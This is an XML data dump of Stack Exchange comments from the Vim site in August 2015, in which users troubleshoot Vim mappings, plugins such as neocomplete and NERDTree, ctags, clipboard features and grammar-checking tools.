  <row Id="6407" PostId="4359" Score="0" Text="Oh I thought you was just stating that you used vimhelp but I didn't understood that you really didn't want to use vimdoc, sorry for that. Just out of curiousity why do you only want to refer to vimhelp and not vimdoc?" CreationDate="2015-08-16T16:33:08.733" UserId="1841" />
  <row Id="6408" PostId="4359" Score="0" Text="vimdoc's problem is that a) its old and b) it's uncertain which characters need to be encoded. Some special characters work without it. I'd rather avoid that guessing. Besides, getting a vimdoc link is easy: the site searches tags, so its like using `:he`. Vimhelp uses Google, so the search is crap." CreationDate="2015-08-16T16:37:38.633" UserId="205" />
  <row Id="6409" PostId="4359" Score="0" Text="Ok I hadn't noticed a real issue with the encoding on vimdoc, but it's good to know! I hope you'll get another answer because forging url for vimhelp indeed is not really easy to do ;-)" CreationDate="2015-08-16T16:42:14.790" UserId="1841" />
  <row Id="6410" PostId="4360" Score="0" Text="For meaning of `&lt;C-e&gt;` in *popup completion* context, see `:h popupmenu-keys` and scroll down to `CTRL-E`. Also, you don't get `map` results for default Vim key bindings (unless they were set in a script)." CreationDate="2015-08-16T17:04:31.857" UserId="1800" />
  <row Id="6411" PostId="4361" Score="0" Text="I don't use utlisnipts but to sounds like a great idea to use it: that might be a good way not to reinvent the wheel!" CreationDate="2015-08-16T17:05:37.067" UserId="1841" />
  <row Id="6412" PostId="4362" Score="0" Text="What happens if, after insertion, you add a `:silent! :normal! zO` inside your function?" CreationDate="2015-08-16T17:14:07.747" UserId="1800" />
  <row Id="6413" PostId="4343" Score="0" Text="Are you saying that you automatically open multiple windows every time you launch Vim? Why do you do that?" CreationDate="2015-08-16T17:23:30.443" UserId="1060" />
  <row Id="6414" PostId="4360" Score="0" Text="Well `:map &lt;expr&gt;&lt;TAB&gt;` and the likes return the same result, even though they are explicitly set in my .vimrc (they were recommended by neocomplete). Why is that?" CreationDate="2015-08-16T17:52:18.827" UserId="3200" />
  <row Id="6415" PostId="4360" Score="0" Text="Try `:verbose imap &lt;TAB&gt;`" CreationDate="2015-08-16T17:57:00.863" UserId="1800" />
  <row Id="6416" PostId="4292" Score="0" Text="This is a bit of a long shot, but try passing `&lt;abuf&gt;` from the `autocmd` to get the buffer that triggered `BufEnter`, rather than inferring it from `%`.  Contrary to the popular belief (and to the common sense), `autocmd`s are _not_ guaranteed to refer to the current buffer.  Also, they are not triggered in a logical order, so maybe your function queries `buflisted()` before NERDTree gets to hide the buffer." CreationDate="2015-08-16T18:03:26.637" UserId="1577" />
  <row Id="6417" PostId="4360" Score="0" Text="Thanks for suggesting imap. But about the main question, is smart_close_popup the same as cancel_popup?" CreationDate="2015-08-16T18:47:29.300" UserId="3200" />
  <row Id="6419" PostId="4360" Score="0" Text="By reading the help, the smart version would regenerate the popup menu, when you press `&lt;BS&gt;`, but only if `g:neocomplete#enable_auto_select` is set to 1. All these functions and options are [documented](https://github.com/Shougo/neocomplete.vim/blob/master/doc/neocomplete.txt)." CreationDate="2015-08-16T19:08:42.583" UserId="1800" />
  <row Id="6420" PostId="4366" Score="0" Text="`:h func-range`, or use `:&lt;C-u&gt;call Clipboard()&lt;CR&gt;` in your map." CreationDate="2015-08-16T19:14:10.433" UserId="1800" />
  <row Id="6421" PostId="4343" Score="0" Text="@KyleStrand I launch nerdtree for example. since i almost always want it to be there" CreationDate="2015-08-16T19:25:13.577" UserId="1097" />
  <row Id="6422" PostId="4366" Score="0" Text="My gvim can't find help for func-range. Works perfectly though. But how?" CreationDate="2015-08-16T19:27:54.447" UserId="3201" />
  <row Id="6423" PostId="4366" Score="0" Text="Using `range`, the function handles the range itself (`a:firstline`, `a:lastline`), so it's called only once. See [here](http://vimhelp.appspot.com/eval.txt.html#E124). The other approach (using `&lt;C-u&gt;`) works too - you clear the range prior to calling your function, so it's called only once, but you still have access to `v:count` (also `v:count1`) - so it's probably easier to use in your case." CreationDate="2015-08-16T19:48:59.930" UserId="1800" />
  <row Id="6424" PostId="4366" Score="0" Text="BTW your exercise could be resumed to: `noremap YY :y&lt;cr&gt;`, with visual mode support." CreationDate="2015-08-16T19:55:54.613" UserId="1800" />
  <row Id="6425" PostId="4292" Score="0" Text="@lcd047: Thanks for your comment. I edited my question to explain what I've done but the tl;dr version is: the buffer numbers are the same than with the previous version and now all buffers appears as not listed. The more I try new things the more I get confused with the behavior of this function." CreationDate="2015-08-16T19:56:00.200" UserId="1841" />
  <row Id="6426" PostId="4360" Score="0" Text="Thanks lol. Although playing detective might be a bit fun sometimes, that is so much more convenient. Idk how I missed it (I was on that page)..." CreationDate="2015-08-16T20:38:22.763" UserId="3200" />
  <row Id="6427" PostId="4366" Score="1" Text="Thanks a lot mate. Not going to pretend I understand all that, maybe someday. What's important is that it works for now" CreationDate="2015-08-16T20:40:22.517" UserId="3201" />
  <row Id="6428" PostId="4360" Score="0" Text="It's ok to dig vimscript :)" CreationDate="2015-08-16T20:42:39.663" UserId="1800" />
  <row Id="6429" PostId="4354" Score="0" Text="I think @statox may be right. Though, the completion you want works as expected withouth altering `iskeyword` in my plugin, [vimtex](https://github.com/lervag/vimtex), and I believe it also should work in [LaTeX-Box](https://github.com/LaTeX-Box-Team/LaTeX-Box)." CreationDate="2015-08-16T20:48:33.233" UserId="21" />
  <row Id="6430" PostId="4360" Score="0" Text="Hey, hey... smart_close_popup doesn't do what it says it does. It doesn't insert the candidate. That's the thing. That's why I looked into it from the beginning. I guess it's some bug, but I still don't get why the function would call another function that calls cancel_popup. You got any idea? Sorry to keep bothering you..." CreationDate="2015-08-16T21:30:08.543" UserId="3200" />
  <row Id="6431" PostId="4292" Score="0" Text="`&lt;abuf&gt;` is only valid in `autocmd` lines.  Also, buffer functions make a difference between strings and numbers.  This is a common pitfall, because buffer numbers can get implicitly converted to strings, and `buflisted(&quot;2&quot;)` is very different from `buflisted(2)`.  For this reason, it's always a good idea to call `str2nr()` when you want buffer numbers, even when you don't see any obvious reason why the argument might have been converted to a string. :) In particular, try `str2nr(expand('&lt;abuf&gt;'))` instead of just `expand('&lt;abuf&gt;')`.  Tests like `type(buf) == type(0)` are also a good idea." CreationDate="2015-08-17T03:51:14.537" UserId="1577" />
  <row Id="6432" PostId="4351" Score="0" Text="It should be noted that `S` is already a vim normal command (although you can use `cc` instead). This overshadowing can cause a delay. Also [surround.vim](https://github.com/tpope/vim-surround), a very common plugin, uses `S` for visual mappings. Just thoughts to think about when choosing your mappings. You may want to look into `&lt;Leader&gt;`. See `:h &lt;Leader&gt;`." CreationDate="2015-08-17T04:51:16.467" UserId="778" />
  <row Id="6433" PostId="4358" Score="0" Text="May want to use `repeat()` instead of a loop. See `:h repeat()`" CreationDate="2015-08-17T07:01:29.787" UserId="778" />
  <row Id="6434" PostId="4360" Score="0" Text="@Mattias: I propose you open an issue on [neocomplete](https://github.com/Shougo/neocomplete.vim/issues), Shougo tends to be very quick in responding to issues. If you do, please link to the issue (I would be interested in following it)." CreationDate="2015-08-17T07:07:13.580" UserId="21" />
  <row Id="6435" PostId="4358" Score="0" Text="@PeterRincker nice function I didn't knew it. What is its advantage compared to a loop (excepted the fact that it requires less lines to write it)?" CreationDate="2015-08-17T08:04:22.893" UserId="1841" />
  <row Id="6436" PostId="4292" Score="0" Text="@lcd047: Good to know for the conversion: I had read in [`:h 41.2`](http://vimdoc.sourceforge.net/htmldoc/usr_41.html) that `Vim automatically converts a string to a number when it is looking for a number.  When using a string that doesn't start with a digit the resulting number is zero.` so that is a little bit misleading. Now when modifying the autocommand to `autocmd! BufEnter * call AddBufferToTab(str2nr(expand('&lt;abuf&gt;')))` the listed/not listed are seen properly but the behavior is still the same: NerdTree buffers are added even if the function doesn't output the debugging messages." CreationDate="2015-08-17T08:14:57.827" UserId="1841" />
  <row Id="6438" PostId="4360" Score="0" Text="there u go: https://github.com/Shougo/neocomplete.vim/issues/463 :)" CreationDate="2015-08-17T09:53:53.480" UserId="3200" />
  <row Id="6439" PostId="4351" Score="0" Text="How does overshadowing cause delay? I do use `&lt;leader&gt;` for most of my mappings but I do not see a problem remapping some of the default bindings that I never use (like `H, M, K, L, S and Q`)." CreationDate="2015-08-17T10:34:32.143" UserId="3032" />
  <row Id="6440" PostId="4355" Score="0" Text="This is mostly workarounds for my specific examples. I was wondering if there is a universal pattern to would work for all mappings that need to yank text. Judging by the low amount of answers I assume that there is not so I will accept this answer as it shows a few good workarounds for the problem." CreationDate="2015-08-17T10:40:47.760" UserId="3032" />
  <row Id="6442" PostId="4358" Score="0" Text="@statox there are 2 reasons to use repeat over a loop. 1) shorter 2) quick comprehension - instead of having to read and understand the loop, you can easily understand what is going on. As an example compare your function to [mine](https://gist.github.com/PeterRincker/6e16e5a82065d7f9809f)." CreationDate="2015-08-17T11:11:19.210" UserId="778" />
  <row Id="6443" PostId="4353" Score="0" Text="I wrote a little plugin &quot;blockit&quot; (https://github.com/sk1418/blockit) to generate some header texts (comment could be done as well) with alignments, width, border characters as options , it may not work exactly as what you want, but you can check the codes to do some adjustment." CreationDate="2015-08-17T11:27:34.287" UserId="1569" />
  <row Id="6444" PostId="4374" Score="0" Text="Your first example doesn't seem to match `foo` at the start of the line, or the word `foobar`, which is sort of what I would expect? In fact, it only seems to match the last occurrence of the match on the current line (rather than all matches on the current line)... I don't know of a better way to do this, though..." CreationDate="2015-08-17T11:46:29.697" UserId="51" />
  <row Id="6445" PostId="4355" Score="0" Text="These are not workaround, they show the &quot;right&quot; way to do what you want. The universal pattern you ask for is demonstrated in `GetVisualSelection()`: 1. backup an arbitrary register, 2. yank to that register, 3. use the content of that register and 4. restore it when you are done." CreationDate="2015-08-17T12:07:06.040" UserId="54" />
  <row Id="6446" PostId="4358" Score="0" Text="@PeterRincker Indeed that's a great way to rewrite it! I'll investigate the `repeat` command which seems really good, thanks." CreationDate="2015-08-17T12:08:00.483" UserId="1841" />
  <row Id="6447" PostId="4374" Score="0" Text="It will match at the start of the line. The problem is multiple matches. That is where things go wrong, so very wrong. To be perfectly honest I think regex has too much going on. It would not be difficult to use the `/\%l` method if a simple mapping, e.g. `nnoremap &lt;key&gt; /\%&lt;c-r&gt;=line('.')&lt;cr&gt;l`" CreationDate="2015-08-17T12:08:00.503" UserId="778" />
  <row Id="6449" PostId="4358" Score="0" Text="@statox please feel free to use it in your answer." CreationDate="2015-08-17T12:21:15.813" UserId="778" />
  <row Id="6450" PostId="4358" Score="0" Text="Erf I misclicked and removed my previous comment: to keep the history coherent I was asking to Peter if I could include part of his version to my answer." CreationDate="2015-08-17T12:22:49.887" UserId="1841" />
  <row Id="6451" PostId="4377" Score="0" Text="Nice and complete answer, thanks for the deep investigation! I'll probably see to add the double check + remove mechanism." CreationDate="2015-08-17T13:58:29.710" UserId="1841" />
  <row Id="6452" PostId="4371" Score="0" Text="your setting still doesn't make the `-`s aligned." CreationDate="2015-08-17T14:23:58.033" UserId="1097" />
  <row Id="6453" PostId="4371" Score="0" Text="Hm that's pretty weird it works on my setup... I'll check if something else might interfere" CreationDate="2015-08-17T14:25:55.043" UserId="1841" />
  <row Id="6454" PostId="4371" Score="0" Text="@HuStmpHrrr: Is `cindent` enabled on your system? (you can check with `:set cindent?` it will output `cindent`or `nocindent`) If it is enabled try disabling it with `:set nocindent` and see if it solves the problem." CreationDate="2015-08-17T14:39:43.123" UserId="1841" />
  <row Id="6455" PostId="4371" Score="0" Text="`cindent` is not on indeed. but why would i need `cindent` on in haskell anyway? will `cindent` corrupt the indent config set up by other plugins?" CreationDate="2015-08-17T15:04:45.287" UserId="1097" />
  <row Id="6456" PostId="4371" Score="0" Text="Not you don't need it but when enabled it can mess your config, as I don't know your configuration I was just trying to find what could go wrong." CreationDate="2015-08-17T15:06:48.870" UserId="1841" />
  <row Id="6457" PostId="4379" Score="0" Text="I'm closing this question as 'primarily opinion based'. This *doesn't* mean this is a bad or invalid question as such, but rather that it doesn't fit this site's format very well. This is a good topic for a *debate site*, where people can respond to each other and discus various points, which is something you can't really do here because that's not what it was designed for..." CreationDate="2015-08-17T15:10:59.150" UserId="51" />
  <row Id="6458" PostId="4371" Score="0" Text="i use haskell-mode, which internally it should use haskell.vim to setup indent." CreationDate="2015-08-17T15:24:05.730" UserId="1097" />
  <row Id="6459" PostId="4382" Score="0" Text="Do you see an error message when you type `Ctrl-]`? Vim will report an error if it can't find a tags file or can't find a tag in the tags file." CreationDate="2015-08-17T16:16:08.403" UserId="2055" />
  <row Id="6460" PostId="4382" Score="0" Text="Yeah, it just says &quot;tag not found&quot;, no matter what tag I'm searching for." CreationDate="2015-08-17T16:21:52.773" UserId="3210" />
  <row Id="6461" PostId="4383" Score="0" Text="Somehow, it's even worse...it doesn't find any of my functions at all." CreationDate="2015-08-17T16:22:10.920" UserId="3210" />
  <row Id="6462" PostId="4382" Score="0" Text="OK, then try the command `:echo tagfiles()` and see if the file names it reports include the one you built. If the names are relative, execute `:pwd` to be sure the current working directory is what you think it is." CreationDate="2015-08-17T16:56:29.257" UserId="2055" />
  <row Id="6463" PostId="4382" Score="0" Text="You might also try searching for a tag from the command line using the `:tag` command. I'm wondering if your `iskeyword` setting conflicts with the ctags program's idea of what a word is, which would interfere with the ability of `Ctrl-]` to grab the right tag." CreationDate="2015-08-17T16:59:17.520" UserId="2055" />
  <row Id="6464" PostId="4382" Score="0" Text="When you write *&quot;I also have tern-js installed.&quot;*, is it only the node module or the node module *and* [tern_for_vim](https://github.com/marijnh/tern_for_vim)? That plugin provides — among other features — a &quot;jump to definition&quot; command (`:TernDef`) that is a lot smarter than `:tag` so… with that plugin installed you don't really need ctags to navigate your JavaScript project. Anyway, do you get anything when doing `:echo taglist(&quot;.&quot;)`?" CreationDate="2015-08-17T18:55:18.507" UserId="54" />
  <row Id="6465" PostId="4384" Score="0" Text="lol at that rate we'll end up with a plugin. I would love visual mode functionality, how do I modify it?" CreationDate="2015-08-17T18:55:33.530" UserId="3201" />
  <row Id="6466" PostId="4384" Score="0" Text="Visual mode mapping: `xnoremap &lt;key&gt; &quot;+y`. You can experiment with using `&quot;+y` and `&quot;+Y` to meet your needs." CreationDate="2015-08-17T18:59:11.237" UserId="778" />
  <row Id="6467" PostId="4382" Score="0" Text="hmm ok so ctags seems to work when I do `Ctrl+]` over a reference to an external js library I'm using, just not for my own code. `:TernDef` isn't working for the functions I'm trying to find either. Maybe I'm using it wrong? `:TernRefs` works." CreationDate="2015-08-17T19:30:27.390" UserId="3210" />
  <row Id="6469" PostId="4265" Score="0" Text="Thanks for your help! I haven't tried this function yet, but it looks like what I wanted." CreationDate="2015-08-18T00:46:35.153" UserId="2976" />
  <row Id="6470" PostId="4050" Score="0" Text="Thank you, joeytwiddle and jjaderberg!" CreationDate="2015-08-18T00:47:02.813" UserId="2976" />
  <row Id="6471" PostId="4386" Score="0" Text="Nice quick fix. It might break though, if you are sitting inside a string which contains one of the matching patterns. There have been [a couple](http://vi.stackexchange.com/questions/4348#4350) of [questions](http://vi.stackexchange.com/questions/4050#4265) recently about looking up the syntax attached to characters. That could be used to skip unwanted matches." CreationDate="2015-08-18T00:49:27.760" UserId="630" />
  <row Id="6472" PostId="4265" Score="0" Text="The [vimtips wiki on syntax lookup:](http://vim.wikia.com/wiki/Identify_the_syntax_highlighting_group_used_at_the_cursor)." CreationDate="2015-08-18T00:52:58.150" UserId="630" />
  <row Id="6473" PostId="4387" Score="0" Text="Nice idea. You can create a highlight with `matchadd()`, but slightly more tricky is working out which parts of the file have changed." CreationDate="2015-08-18T00:57:20.670" UserId="630" />
  <row Id="6474" PostId="4386" Score="1" Text="It would break if the latter part of the mapping didn't use `vi&quot;` to actually select the string. You could also do some [fancy look-behind](http://stackoverflow.com/a/11859562/438329) to avoid sniffing syntax." CreationDate="2015-08-18T01:55:50.293" UserId="778" />
  <row Id="6475" PostId="4389" Score="1" Text="`:h motion.txt` will blow your mind." CreationDate="2015-08-18T05:44:39.957" UserId="54" />
  <row Id="6476" PostId="4394" Score="1" Text="Try looking at http://stackoverflow.com/questions/20430493/how-to-generate-random-numbers-in-the-buffer to see if that helps" CreationDate="2015-08-18T09:37:16.670" UserId="1821" />
  <row Id="6477" PostId="4387" Score="0" Text="Perhaps saving to a temporary buffer/file before the undo, then to a 2nd buffer/file after the undo, and highlighting the new diffs after cleaning (or changing the color of) the previous ones. Could get slow for large files." CreationDate="2015-08-18T09:55:51.283" UserId="1800" />
  <row Id="6478" PostId="4318" Score="0" Text="I think all possible situations where one would *need* to move by `sw` are covered by other vim commands. For example, if one would need to move one indent level back and start inserting code there, we could instead de-indent first with `&lt;&lt;` and then press `I` to insert in the beginning of the line." CreationDate="2015-08-18T11:07:01.340" UserId="599" />
  <row Id="6479" PostId="4041" Score="0" Text="`$ echo $EDITOR` return an empty line?!?!?!" CreationDate="2015-08-18T13:04:19.980" UserId="2965" />
  <row Id="6480" PostId="4397" Score="2" Text="This seems great : http://www.afterthedeadline.com/ Do you think it could suits you needs ? There is a python cli program here : https://github.com/lpenz/atdtool" CreationDate="2015-08-18T15:06:54.173" UserId="1821" />
  <row Id="6481" PostId="4370" Score="1" Text="I would also save the configured `foldmethod` before overriding it, this way you could restore the previous configuration automatically." CreationDate="2015-08-18T15:20:52.640" UserId="1821" />
  <row Id="6482" PostId="4396" Score="0" Text="The above macro is generating a random number with 4 or 5 digits. Along with the numbers the characters &quot;^Mld&quot; is appended. But it is not appending to the end of the line. It is creating a new line. I guess the commands ld$ and kJ is not working. Is there any dependence where those commands might not work?" CreationDate="2015-08-18T15:22:43.457" UserId="3213" />
  <row Id="6483" PostId="4396" Score="0" Text="The `^M` stands for the litteral `&lt;CR&gt;`, I edited my answer to be more clear. I don't understand why the `ld$kJ` part doesn't work as it's basic vim commands ..." CreationDate="2015-08-18T15:24:48.650" UserId="1821" />
  <row Id="6484" PostId="4390" Score="0" Text="`viw` is the sequence I was looking for; thank-you." CreationDate="2015-08-18T15:46:38.860" UserId="3212" />
  <row Id="6485" PostId="4391" Score="1" Text="Thanks for the explanation of why the mapping fails. `viw` is indeed what I was looking for." CreationDate="2015-08-18T15:50:29.803" UserId="3212" />
  <row Id="6486" PostId="4397" Score="0" Text="I think you are bound to use an external tool. If you manage to make it work for you, LanguageTool could still be the solution." CreationDate="2015-08-18T16:04:29.883" UserId="1800" />
  <row Id="6487" PostId="4397" Score="0" Text="Another plugin, based also on LanguageTool: https://github.com/rhysd/vim-grammarous" CreationDate="2015-08-18T16:10:40.917" UserId="1800" />
  <row Id="6488" PostId="4396" Score="0" Text="Thanks. It worked." CreationDate="2015-08-18T16:11:08.737" UserId="3213" />
  <row Id="6489" PostId="4397" Score="0" Text="@VanLaser thanks for your plugin, the problem of LanguageTool is that it requires Java which is a really turn off for me. Also (excepted the probably huge amout of work it represent) what would be the limitations which would prevent someone to do a native grammar checker in Vim?" CreationDate="2015-08-18T16:13:54.840" UserId="1841" />
  <row Id="6490" PostId="4398" Score="0" Text="Did you miss the $ for the pattern in :g command?" CreationDate="2015-08-18T16:13:59.107" UserId="3213" />
  <row Id="6491" PostId="4397" Score="0" Text="@Nobe4: thanks for the link i'll check that as see if it suit my needs!" CreationDate="2015-08-18T16:14:29.417" UserId="1841" />
  <row Id="6492" PostId="4397" Score="2" Text="@statox - &quot;native&quot; complicate stuff would better suit Emacs; with Vim, re-using *external* tools is usually the best approach. And Java is not *necessarily* evil (example: http://ditaa.sourceforge.net/)" CreationDate="2015-08-18T16:15:53.433" UserId="1800" />
  <row Id="6493" PostId="4398" Score="0" Text="Sorry my mistake. It works." CreationDate="2015-08-18T16:16:33.953" UserId="3213" />
  <row Id="6494" PostId="4397" Score="0" Text="@VanLaser I see what you mean. You're right on this point." CreationDate="2015-08-18T16:17:52.527" UserId="1841" />
  <row Id="6496" PostId="4400" Score="0" Text="Ah I didn't think this would involve concatenation, I guess execute is a bit like `eval` in Javascript for ':' commands.  Thank you." CreationDate="2015-08-18T17:11:25.447" UserId="1065" />
  <row Id="6497" PostId="4399" Score="1" Text="A visual selection over the desired lines, followed by `:'&lt;,'&gt;s/$/\=line('.')/` (where `'&lt;,'&gt;` are automatically inserted) would seem to accomplish what's in your code (if it helps somewhere)." CreationDate="2015-08-18T17:20:30.633" UserId="1800" />
  <row Id="6498" PostId="3834" Score="0" Text="If you really want that patch included, cheer at vim_dev There haven't been many requests for a random number generator." CreationDate="2015-08-18T18:14:55.627" UserId="71" />
  <row Id="6502" PostId="4404" Score="0" Text="Welcome to vi.se! Your answer is correct, as far as I can tell, but I think the question specifically regards compiling Vim with or without particular features, and what the difference is between the Vim features `clipboard` and `xterm_clipboard` (see `:help feature-list|/^clipboard\|^xterm_clipboard`). If the primary and selection buffers are related to the Vim 'features' `clipboard` and `xterm_clipboard`, a note about this would be a valuable addition." CreationDate="2015-08-18T19:30:53.887" UserId="1306" />
  <row Id="6503" PostId="4404" Score="0" Text="Thank you @jjaderberg. I agree, that's a miss on my end (about how xterm_clipboard relates to Primary). I looked up this particular term in `:help xterm_clipboard` in vim help as well, but from reading it inferred that this must refer to Primary. That may have been a wrong assumption. Then I looked at http://invisible-island.net/xterm/manpage/xterm.html (or `man xterm`) where I could not find any other definition of clipboard. So, I assumed that vim's &quot;xterm_clipboard&quot; must be Primary, which is why I wrote what it is. Let me put this assumption in the answer." CreationDate="2015-08-18T19:40:47.687" UserId="3006" />
  <row Id="6504" PostId="4397" Score="0" Text="@VanLaser: I'm not against Java itself it just that on some machines that I use I don't have it installed for some reasons and then using external java programs becomes an issue. (That will be my last comment here, sorry for flooding the thread :-) )" CreationDate="2015-08-18T19:50:13.210" UserId="1841" />
  <row Id="6505" PostId="4404" Score="0" Text="Excellent, +1. I thought you were talking about the general difference between selection and primary, but with the last edit I understand how you relate these to the `clipboard` and `xterm_clipboard` Vim features. Links are good too (and if I may I will edit just to make the `:help xterm_clipboard` reference explicit)." CreationDate="2015-08-18T19:52:51.267" UserId="1306" />
  <row Id="6506" PostId="4404" Score="0" Text="Thank you @jjaderberg. Good edit and good job guiding me." CreationDate="2015-08-18T20:04:36.150" UserId="3006" />
  <row Id="6507" PostId="4397" Score="0" Text="No problem really, if I can avoid Java, I do it :)" CreationDate="2015-08-18T20:28:02.033" UserId="1800" />
  <row Id="6508" PostId="4406" Score="0" Text="Very cool.  I was looking for a command-line / shell solution, but this may be a workable substitute." CreationDate="2015-08-18T20:56:32.103" UserId="3222" />
  <row Id="6509" PostId="4407" Score="1" Text="Why `execute &quot;normal! o&quot;` and not `normal! o`?" CreationDate="2015-08-18T22:37:39.437" UserId="54" />
  <row Id="6510" PostId="4408" Score="0" Text="Maybe I should have been more specific.  I am trying to pipe commands.  This is most of the answer, but there have been quite a few gotcha's in the piping process that I am still trying to work out.  That and you still can't use &quot; -- must use ' in msysgit." CreationDate="2015-08-18T22:52:14.903" UserId="3222" />
  <row Id="6511" PostId="4405" Score="0" Text="Perhaps if you find a form of 'vipe' (moreutils) that runs in msysgitwindows." CreationDate="2015-08-18T23:41:26.317" UserId="1800" />
  <row Id="6512" PostId="4408" Score="0" Text="Ah yes, I will add an explanation on that. (once I figure it out)" CreationDate="2015-08-19T00:01:46.640" UserId="865" />
  <row Id="6513" PostId="4411" Score="5" Text="Who's &quot;you&quot; ? `let [personality1, personality2] = MeAsksMeAlsoAnswers()` :)" CreationDate="2015-08-19T00:03:58.333" UserId="1800" />
  <row Id="6514" PostId="4386" Score="0" Text="Awesome. This mapping is smarter than me." CreationDate="2015-08-19T00:37:27.953" UserId="630" />
  <row Id="6515" PostId="4413" Score="2" Text="`viwy` -&gt; `yiw` (visual detour unnecessary)" CreationDate="2015-08-19T02:45:21.433" UserId="1800" />
  <row Id="6516" PostId="4413" Score="1" Text="Yeah my bad what I was doing wasn't working so I did it the roundabout way . I'll update" CreationDate="2015-08-19T02:56:07.693" UserId="1313" />
  <row Id="6517" PostId="4409" Score="0" Text="Clear like crystal! Thanks :)" CreationDate="2015-08-19T05:50:17.077" UserId="2978" />
  <row Id="6518" PostId="4407" Score="0" Text="@romainl Just a habit as it allows use of special characters (see `:help normal` and answer below)." CreationDate="2015-08-19T05:51:35.970" UserId="2978" />
  <row Id="6519" PostId="4407" Score="0" Text="Well it's useless here, you might as well make your script simpler." CreationDate="2015-08-19T07:11:02.063" UserId="54" />
  <row Id="6520" PostId="4077" Score="0" Text="Works beautifully, thanks!" CreationDate="2015-08-19T07:37:01.757" UserId="237" />
  <row Id="6521" PostId="4406" Score="3" Text="While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference.  Link-only answers can become invalid if the linked page changes." CreationDate="2015-08-19T08:27:27.403" UserId="1841" />
  <row Id="6522" PostId="4397" Score="0" Text="Just tested atdtool and it integrates nicely with vim without needing to install Java but I didn't found any support for non-english language. While searching for alternative I noticed that LanguageTool is the &quot;best&quot; utility available." CreationDate="2015-08-19T08:41:09.163" UserId="1821" />
  <row Id="6523" PostId="4415" Score="0" Text="have you tried changing the font-size ? also you can try with this font that works great : https://github.com/larsenwork/monoid" CreationDate="2015-08-19T08:54:42.377" UserId="1821" />
  <row Id="6524" PostId="4415" Score="0" Text="Yes, I've. Changing the font-size makes the space out, but at the same time, it also makes the arrow (much more)bigger than the box, and it looks awkward." CreationDate="2015-08-19T08:58:12.327" UserId="3229" />
  <row Id="6525" PostId="4415" Score="0" Text="You should see https://github.com/bling/vim-airline/issues/702" CreationDate="2015-08-19T09:02:08.327" UserId="1821" />
  <row Id="6526" PostId="4415" Score="0" Text="Installing Monoid didn't help." CreationDate="2015-08-19T09:04:08.517" UserId="3229" />
  <row Id="6527" PostId="4415" Score="0" Text="No, neither one helped." CreationDate="2015-08-19T09:09:00.050" UserId="3229" />
  <row Id="6528" PostId="4415" Score="0" Text="I think this is a terminal related problem, more than a Vim specific issue" CreationDate="2015-08-19T09:09:43.393" UserId="1821" />
  <row Id="6529" PostId="4415" Score="0" Text="I'm using iTerm, and regarding settings, I've done the settings. And please note that I've install `input` font from powerline-fonts." CreationDate="2015-08-19T09:11:24.660" UserId="3229" />
  <row Id="6530" PostId="4364" Score="0" Text="I've ticked @romainl but your answer was interesting too, and the clip :)" CreationDate="2015-08-19T09:13:17.890" UserId="2985" />
  <row Id="6531" PostId="4415" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/27133/discussion-between-nobe4-and-arslan-ali)." CreationDate="2015-08-19T09:14:16.560" UserId="1821" />
  <row Id="6532" PostId="3897" Score="0" Text="as the question was answered (and IMHO correctly) could you accept it ?" CreationDate="2015-08-19T09:56:48.923" UserId="1821" />
  <row Id="6533" PostId="4364" Score="0" Text="You chose well :)" CreationDate="2015-08-19T10:41:16.467" UserId="1800" />
  <row Id="6534" PostId="4413" Score="1" Text="You don't even need to `yiw`. You can instead put `&lt;cword&gt;` in the substitute command and it will be replaced with the current word under the cursor on execution. `:help &lt;cword&gt;` for more details and other such keywords." CreationDate="2015-08-19T11:56:41.853" UserId="20" />
  <row Id="6535" PostId="4417" Score="2" Text="There's a caveat with `:vimgrep/set/ %`, that you have to already have the file saved, but it works great! Thanks!" CreationDate="2015-08-19T12:01:59.600" UserId="1065" />
  <row Id="6536" PostId="4419" Score="0" Text="sorry for explicitly asking: `:normal` will allow to execute the command as if I would enter it when navigating with the cursor?" CreationDate="2015-08-19T12:35:26.307" UserId="3232" />
  <row Id="6537" PostId="4419" Score="1" Text="`:normal` allows you to execute a command as it was entered  in normal mode (when you navigate the cursor with `hjkl`). See : `:h :normal`" CreationDate="2015-08-19T12:37:44.103" UserId="1821" />
  <row Id="6538" PostId="4408" Score="1" Text="Hm, I see what your issue is now.   Vim can't seem to read from stdin if it is started in ex mode.  I'll have to look into it more." CreationDate="2015-08-19T12:46:33.563" UserId="865" />
  <row Id="6539" PostId="4418" Score="2" Text="Also: `:1,10s/\v^(\s|\d)*/` (remove any number of spaces or digits at the start of the first 10 lines)" CreationDate="2015-08-19T13:18:12.103" UserId="1800" />
  <row Id="6540" PostId="4397" Score="0" Text="For what it's worth: syntastic [supports](https://github.com/scrooloose/syntastic/wiki/Syntax-Checkers#text) both atdtool and language_check (which is a front-end to LanguageTool)." CreationDate="2015-08-19T15:21:54.960" UserId="1577" />
  <row Id="6541" PostId="4412" Score="0" Text="The answers to [this StackOverflow question](http://stackoverflow.com/questions/23975604/in-vim-how-do-i-get-the-total-number-of-matches-after-doing-a-search) tend to show the number of the current match as well as the total number of matches.  [My solution](http://stackoverflow.com/questions/23975604#comment-36954682) displays `(3/5)` in the statusbar, although it counts matching lines, not matches." CreationDate="2015-08-19T21:38:49.183" UserId="630" />
  <row Id="6543" PostId="4392" Score="0" Text="there is a way to clear the message &quot;buffer&quot; on DiffWithPrevious() ? I wish the function highlighted just the last changes,but highlight is accumulating over time, im trying something like message = 0 or message = &quot;&quot;  but no sucess." CreationDate="2015-08-19T22:29:06.597" UserId="2131" />
  <row Id="6544" PostId="4413" Score="0" Text="&lt;cword&gt; was something I learned form this thread and bery useful it was to :)" CreationDate="2015-08-19T23:20:46.197" UserId="1313" />
  <row Id="6545" PostId="4419" Score="1" Text="The colons in front of normal after the range are redundant." CreationDate="2015-08-20T01:24:39.560" UserId="46" />
  <row Id="6548" PostId="4392" Score="0" Text="Of course yeah, let me update my answer." CreationDate="2015-08-20T04:15:02.743" UserId="1821" />
  <row Id="6549" PostId="4396" Score="1" Text="-1, this is very, very far from random. Bash's `$RANDOM` returns a random number from 0 to 32767, so your results will be heavily biased towards 0, 1, and 2." CreationDate="2015-08-20T11:23:19.170" UserId="88" />
  <row Id="6550" PostId="4396" Score="0" Text="I didn't know that, let me update my answer." CreationDate="2015-08-20T11:24:40.803" UserId="1821" />
